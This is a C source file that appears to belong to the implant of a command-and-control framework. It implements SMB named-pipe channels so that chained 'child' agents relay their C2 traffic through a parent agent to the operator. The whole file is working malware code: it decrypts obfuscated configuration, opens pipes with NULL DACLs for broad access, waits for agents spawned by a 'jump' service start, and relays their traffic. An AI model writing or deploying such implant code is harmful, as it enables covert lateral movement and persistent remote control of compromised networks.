/*
 * channel_smb.c — SMB named pipe channel.
 *
 * Two modes:
 *   1. Client: connects to a remote (or local) named pipe for C2 comms.
 *      Used when this agent is a "child" in a chaining scenario.
 *   2. Server: listens on a named pipe for child agents.
 *      Relays child traffic through the parent's active channel.
 *
 * Wire format over pipe is identical to all other channels:
 *   LENGTH_PREFIX(4 LE) + PACKET(MAGIC+SIZE+MSG_ID+ENCRYPTED)
 *
 * Uses Win32 API directly (CreateNamedPipeW, CreateFileW, ReadFile,
 * WriteFile) — NOT System.IO.Pipes or higher-level abstractions.
 */
#include "agent.h"

/* ─── SMB Client (connect to pipe for C2) ─── */

static HANDLE g_pipe_client = INVALID_HANDLE_VALUE;

BOOL smb_init(void) {
    if (CONFIG_PIPE_ENABLED != 2) return FALSE; /* 2 = client mode */

    /* Build pipe path: \\<host>\pipe\<name> or \\.\pipe\<name> */
    char pipe_name_dec[256];
    DECRYPT_CONFIG(pipe_name_dec, PIPE_NAME);
    char pipe_host_dec[256];
    DECRYPT_CONFIG(pipe_host_dec, PIPE_HOST);

    char pipe_path[512];
    if (pipe_host_dec[0] != '\0') {
        snprintf(pipe_path, sizeof(pipe_path), "\\\\%s\\pipe\\%s",
                 pipe_host_dec, pipe_name_dec + 9); /* Skip \\.\pipe\ prefix */
    } else {
        strncpy(pipe_path, pipe_name_dec, sizeof(pipe_path) - 1);
    }
    SecureZeroMemory(pipe_name_dec, sizeof(pipe_name_dec));
    SecureZeroMemory(pipe_host_dec, sizeof(pipe_host_dec));

    wchar_t wPipePath[512];
    MultiByteToWideChar(CP_UTF8, 0, pipe_path, -1, wPipePath, 512);

    /* Try to connect with retry */
    for (int attempt = 0; attempt < 5; attempt++) {
        g_pipe_client = CreateFileW(
            wPipePath,
            GENERIC_READ | GENERIC_WRITE,
            0,
            NULL,
            OPEN_EXISTING,
            0,
            NULL
        );

        if (g_pipe_client != INVALID_HANDLE_VALUE)
            break;

        /* Wait for pipe to become available */
        if (GetLastError() == ERROR_PIPE_BUSY) {
            WaitNamedPipeW(wPipePath, 5000);
        } else {
            Sleep(2000);
        }
    }

    if (g_pipe_client == INVALID_HANDLE_VALUE)
        return FALSE;

    /* Set pipe to message mode */
    DWORD mode = PIPE_READMODE_BYTE;
    SetNamedPipeHandleState(g_pipe_client, &mode, NULL, NULL);

    return TRUE;
}

void smb_cleanup(void) {
    if (g_pipe_client != INVALID_HANDLE_VALUE) {
        CloseHandle(g_pipe_client);
        g_pipe_client = INVALID_HANDLE_VALUE;
    }
}

/*
 * Pipe wire format:
 *   [4 bytes LE: total_length] [payload bytes]
 * This length prefix is needed because pipes are stream-oriented
 * and a single ReadFile may not return the complete message.
 */

static BOOL pipe_write_framed(HANDLE pipe, const unsigned char *data, DWORD len) {
    DWORD written;
    /* Write 4-byte length prefix */
    DWORD net_len = len;
    if (!WriteFile(pipe, &net_len, 4, &written, NULL) || written != 4)
        return FALSE;
    /* Write payload */
    DWORD total_written = 0;
    while (total_written < len) {
        if (!WriteFile(pipe, data + total_written, len - total_written, &written, NULL))
            return FALSE;
        total_written += written;
    }
    return TRUE;
}

static BOOL pipe_read_framed(HANDLE pipe, unsigned char **data, DWORD *data_len) {
    DWORD bytes_read;
    /* Read 4-byte length prefix */
    DWORD msg_len;
    if (!ReadFile(pipe, &msg_len, 4, &bytes_read, NULL) || bytes_read != 4)
        return FALSE;

    if (msg_len == 0 || msg_len > 16 * 1024 * 1024) /* Sanity: max 16MB */
        return FALSE;

    *data = (unsigned char *)malloc(msg_len);
    if (!*data) return FALSE;

    DWORD total_read = 0;
    while (total_read < msg_len) {
        if (!ReadFile(pipe, *data + total_read, msg_len - total_read, &bytes_read, NULL) ||
            bytes_read == 0) {
            free(*data);
            *data = NULL;
            return FALSE;
        }
        total_read += bytes_read;
    }

    *data_len = msg_len;
    return TRUE;
}

BOOL smb_send_recv(const unsigned char *packet, DWORD packet_len,
                   unsigned char **response, DWORD *response_len) {
    *response = NULL;
    *response_len = 0;

    if (g_pipe_client == INVALID_HANDLE_VALUE) {
        /* Try reconnect */
        if (!smb_init()) return FALSE;
    }

    /* Write packet */
    if (!pipe_write_framed(g_pipe_client, packet, packet_len)) {
        CloseHandle(g_pipe_client);
        g_pipe_client = INVALID_HANDLE_VALUE;
        return FALSE;
    }

    /* Read response */
    if (!pipe_read_framed(g_pipe_client, response, response_len)) {
        CloseHandle(g_pipe_client);
        g_pipe_client = INVALID_HANDLE_VALUE;
        return FALSE;
    }

    return TRUE;
}

/* ─── SMB Pipe Server (for agent chaining) ─── */

/*
 * The pipe server runs on a dedicated thread. When a child agent
 * connects, it reads requests, relays them through the parent's
 * active C2 channel, and writes responses back.
 *
 * This enables: Operator <--HTTPS--> Agent1 <--SMB pipe--> Agent2
 */

static HANDLE g_pipe_server = INVALID_HANDLE_VALUE;
static HANDLE g_server_thread = NULL;
static volatile BOOL g_server_running = FALSE;

static DWORD WINAPI pipe_server_thread(LPVOID param) {
    (void)param;
    char pipe_name_dec[256];
    DECRYPT_CONFIG(pipe_name_dec, PIPE_NAME);
    wchar_t wPipeName[256];
    MultiByteToWideChar(CP_UTF8, 0, pipe_name_dec, -1, wPipeName, 256);
    SecureZeroMemory(pipe_name_dec, sizeof(pipe_name_dec));

    while (g_server_running) {
        /* Create named pipe instance */
        SECURITY_ATTRIBUTES sa;
        sa.nLength = sizeof(sa);
        sa.bInheritHandle = FALSE;

        /* Use a NULL DACL for broad access (can be tightened per config) */
        PSECURITY_DESCRIPTOR pSD = (PSECURITY_DESCRIPTOR)LocalAlloc(LPTR,
            SECURITY_DESCRIPTOR_MIN_LENGTH);
        if (pSD) {
            InitializeSecurityDescriptor(pSD, SECURITY_DESCRIPTOR_REVISION);
            SetSecurityDescriptorDacl(pSD, TRUE, NULL, FALSE);
            sa.lpSecurityDescriptor = pSD;
        } else {
            sa.lpSecurityDescriptor = NULL;
        }

        g_pipe_server = CreateNamedPipeW(
            wPipeName,
            PIPE_ACCESS_DUPLEX,
            PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
            PIPE_UNLIMITED_INSTANCES,
            65536,     /* Output buffer size */
            65536,     /* Input buffer size */
            0,         /* Default timeout */
            &sa
        );

        if (pSD) LocalFree(pSD);

        if (g_pipe_server == INVALID_HANDLE_VALUE) {
            Sleep(5000);
            continue;
        }

        /* Wait for client connection (blocking) */
        BOOL connected = ConnectNamedPipe(g_pipe_server, NULL)
                         ? TRUE
                         : (GetLastError() == ERROR_PIPE_CONNECTED);

        if (!connected || !g_server_running) {
            CloseHandle(g_pipe_server);
            g_pipe_server = INVALID_HANDLE_VALUE;
            continue;
        }

        /* Handle connected client — relay loop */
        while (g_server_running) {
            unsigned char *client_data = NULL;
            DWORD client_len = 0;

            /* Read request from child agent */
            if (!pipe_read_framed(g_pipe_server, &client_data, &client_len))
                break;

            /* Relay through parent's active channel */
            unsigned char *relay_resp = NULL;
            DWORD relay_resp_len = 0;

            BOOL ok = channel_send_recv(client_data, client_len,
                                         &relay_resp, &relay_resp_len);
            free(client_data);

            if (!ok || !relay_resp) {
                /* Send empty error response */
                DWORD zero = 0;
                DWORD written;
                WriteFile(g_pipe_server, &zero, 4, &written, NULL);
                if (relay_resp) free(relay_resp);
                break;
            }

            /* Write response back to child */
            if (!pipe_write_framed(g_pipe_server, relay_resp, relay_resp_len)) {
                free(relay_resp);
                break;
            }
            free(relay_resp);
        }

        /* Disconnect and loop to accept next client */
        DisconnectNamedPipe(g_pipe_server);
        CloseHandle(g_pipe_server);
        g_pipe_server = INVALID_HANDLE_VALUE;
    }

    return 0;
}

BOOL smb_start_pipe_server(void) {
    if (CONFIG_PIPE_ENABLED != 1) return FALSE; /* 1 = server mode */
    if (g_server_running) return TRUE;

    g_server_running = TRUE;
    g_server_thread = CreateThread(NULL, 0, pipe_server_thread, NULL, 0, NULL);
    return (g_server_thread != NULL);
}

void smb_stop_pipe_server(void) {
    g_server_running = FALSE;

    /* Wake up the blocking ConnectNamedPipe by connecting to it */
    if (g_pipe_server != INVALID_HANDLE_VALUE) {
        char pipe_name_dec[256];
        DECRYPT_CONFIG(pipe_name_dec, PIPE_NAME);
        wchar_t wPipeName[256];
        MultiByteToWideChar(CP_UTF8, 0, pipe_name_dec, -1, wPipeName, 256);
        SecureZeroMemory(pipe_name_dec, sizeof(pipe_name_dec));
        HANDLE hDummy = CreateFileW(wPipeName, GENERIC_READ, 0, NULL,
                                     OPEN_EXISTING, 0, NULL);
        if (hDummy != INVALID_HANDLE_VALUE)
            CloseHandle(hDummy);
    }

    if (g_server_thread) {
        WaitForSingleObject(g_server_thread, 5000);
        CloseHandle(g_server_thread);
        g_server_thread = NULL;
    }
}

BOOL smb_relay_pending(void) {
    /* Not used directly — the relay is handled in the server thread */
    return g_server_running;
}

/* ─── Pipe Child Channel (chained agent) ───
 *
 * When the agent is spawned via "jump" in chained mode, the binPath
 * includes "PIPE:<name>".  The child creates a named pipe SERVER
 * \\.\pipe\<name> and waits for the parent to connect (via auto-link).
 * Once connected, ALL C2 traffic flows through this pipe — the parent
 * relays it to the C2 server.
 *
 * Flow:
 *   Child: CreateNamedPipeW → ConnectNamedPipe (blocks)
 *   Parent: CreateFileW (connects via link) → relay thread
 *   Child: pipe_write_framed(request) → pipe_read_framed(response)
 *   Parent relay: read child request → channel_send_recv → write response
 */

BOOL g_pipe_child_mode = FALSE;
char g_pipe_child_name[256] = {0};

static HANDLE g_pipe_child_handle = INVALID_HANDLE_VALUE;

BOOL pipe_child_init(void) {
    if (!g_pipe_child_mode || g_pipe_child_name[0] == '\0')
        return FALSE;

    /* Build local pipe path: \\.\pipe\<name> */
    char pipe_path[512];
    snprintf(pipe_path, sizeof(pipe_path), "\\\\.\\pipe\\%s", g_pipe_child_name);

    wchar_t wPipePath[512];
    MultiByteToWideChar(CP_UTF8, 0, pipe_path, -1, wPipePath, 512);

    /* Create pipe with NULL DACL so the parent can connect from any context */
    SECURITY_ATTRIBUTES sa;
    sa.nLength = sizeof(sa);
    sa.bInheritHandle = FALSE;
    PSECURITY_DESCRIPTOR pSD = (PSECURITY_DESCRIPTOR)LocalAlloc(LPTR,
        SECURITY_DESCRIPTOR_MIN_LENGTH);
    if (pSD) {
        InitializeSecurityDescriptor(pSD, SECURITY_DESCRIPTOR_REVISION);
        SetSecurityDescriptorDacl(pSD, TRUE, NULL, FALSE);
        sa.lpSecurityDescriptor = pSD;
    } else {
        sa.lpSecurityDescriptor = NULL;
    }

    g_pipe_child_handle = CreateNamedPipeW(
        wPipePath,
        PIPE_ACCESS_DUPLEX,
        PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
        1,          /* Single instance — only parent connects */
        65536,
        65536,
        0,
        &sa
    );

    if (pSD) LocalFree(pSD);

    if (g_pipe_child_handle == INVALID_HANDLE_VALUE)
        return FALSE;

    /* Block until parent connects (parent does auto-link after StartService) */
    BOOL connected = ConnectNamedPipe(g_pipe_child_handle, NULL)
                     ? TRUE
                     : (GetLastError() == ERROR_PIPE_CONNECTED);

    if (!connected) {
        CloseHandle(g_pipe_child_handle);
        g_pipe_child_handle = INVALID_HANDLE_VALUE;
        return FALSE;
    }

    return TRUE;
}

void pipe_child_cleanup(void) {
    if (g_pipe_child_handle != INVALID_HANDLE_VALUE) {
        DisconnectNamedPipe(g_pipe_child_handle);
        CloseHandle(g_pipe_child_handle);
        g_pipe_child_handle = INVALID_HANDLE_VALUE;
    }
}

BOOL pipe_child_send_recv(const unsigned char *packet, DWORD packet_len,
                          unsigned char **response, DWORD *response_len) {
    *response = NULL;
    *response_len = 0;

    /* If pipe is broken (parent died), recreate and wait for new parent */
    if (g_pipe_child_handle == INVALID_HANDLE_VALUE) {
        if (!pipe_child_init())
            return FALSE;
    }

    /* Write request to parent */
    if (!pipe_write_framed(g_pipe_child_handle, packet, packet_len)) {
        /* Pipe broken — tear down and mark for reconnect on next call */
        DisconnectNamedPipe(g_pipe_child_handle);
        CloseHandle(g_pipe_child_handle);
        g_pipe_child_handle = INVALID_HANDLE_VALUE;
        return FALSE;
    }

    /* Read response from parent */
    if (!pipe_read_framed(g_pipe_child_handle, response, response_len)) {
        DisconnectNamedPipe(g_pipe_child_handle);
        CloseHandle(g_pipe_child_handle);
        g_pipe_child_handle = INVALID_HANDLE_VALUE;
        return FALSE;
    }

    return TRUE;
}
